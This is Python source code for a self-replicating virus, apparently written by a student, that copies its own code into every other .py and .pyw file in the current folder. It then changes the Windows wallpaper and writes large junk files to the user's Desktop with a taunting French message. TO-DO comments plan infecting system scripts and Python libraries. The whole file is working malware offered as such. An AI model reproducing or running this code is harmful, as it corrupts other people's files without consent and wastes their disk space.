# startVirus
# this is needed to detect whether if the current file has been infected already or not
# TO DO: find any user scripts in root filesystem 
# TO DO: find and infect any Python libraries 
# TO DO: updating virus code on already infected scripts

import random
import sys
import glob
import os
import ctypes # needed for current payload
 
virusCode = [] 


############## AUTO REPLICATION ##############

# Opening the current script 
print("Opening the current script...")
with open(sys.argv[0], 'r') as f:
    virusLines = f.readlines()

print("Adding replication code to memory...")
# Printing each line of the current script only if not already infected
isInfected = False
for eachLine in virusLines:
    if eachLine == "# startVirus":
        isInfected = True
    if not isInfected:
        virusCode.append(eachLine)
    if eachLine == "# stopVirus\n":
        break 
print("Scanning for other python files...")
# Opening every other python files in the neighborhood 
otherPythonFiles = glob.glob('*.py') + glob.glob('*.pyw')
    
# Get the current script original code
for eachFile in otherPythonFiles:
    print("Python file found : " + eachFile)
    with open(eachFile, 'r') as f:
        originalCode = f.readlines()

    isInfected = False
    # Detect whether if the new opened file is already infected or not
    for line in originalCode:
        if line == "# startVirus\n":
            isInfected = True
            print(eachFile + " has already been infected, skipping...")
            break
    # Inject the payload and the original code to the newly infected file
    if not isInfected:
        print(eachFile + " is not infected. Doing magic...")
        fullHackedCode = []
        fullHackedCode.extend(virusCode)
        fullHackedCode.extend('\n')
        fullHackedCode.extend(originalCode)
        with open(eachFile, 'w') as f:
            f.writelines(fullHackedCode)
print("Done ! Executing the payload...")


############## PAYLOAD ##############

# Changing wallpaper
print("Changing wallpaper...")
wallpaperPath = os.path.abspath("pwned.jpg")
ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaperPath , 0)
   
# Creating x files in the desktop
x = 2
print("Creating " + str(x) + " spam files on the desktop...")
pathToInfect = str(os.path.join(os.environ['USERPROFILE'], "Desktop"))
for i in range(x):
    file = open(pathToInfect+"\pwned!_%d.txt" % i, "w")
    num_chars = 3125000
    file.write("Votre PC à été infécté par un étudiant de l'IPSSI :) profitez de ces " + str(x) + " fichiers d'environ 500 Mo! \n\n")
    file.write(''.join(random.choice('0123456789ABCDEF') for i in range(16)) * num_chars)
    file.close()
print("Bye !\n")
# stopVirus
